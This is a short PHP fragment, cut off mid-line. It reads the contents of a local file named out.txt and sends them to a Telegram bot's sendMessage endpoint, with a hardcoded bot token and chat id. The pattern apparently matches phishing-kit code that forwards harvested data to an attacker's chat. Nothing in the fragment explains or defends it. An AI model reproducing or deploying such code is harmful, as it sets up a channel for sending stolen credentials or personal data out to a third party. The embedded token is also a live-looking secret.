<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/1038421860:AAFAIg95RppKrXmY/sendMessage?chat_id=609859
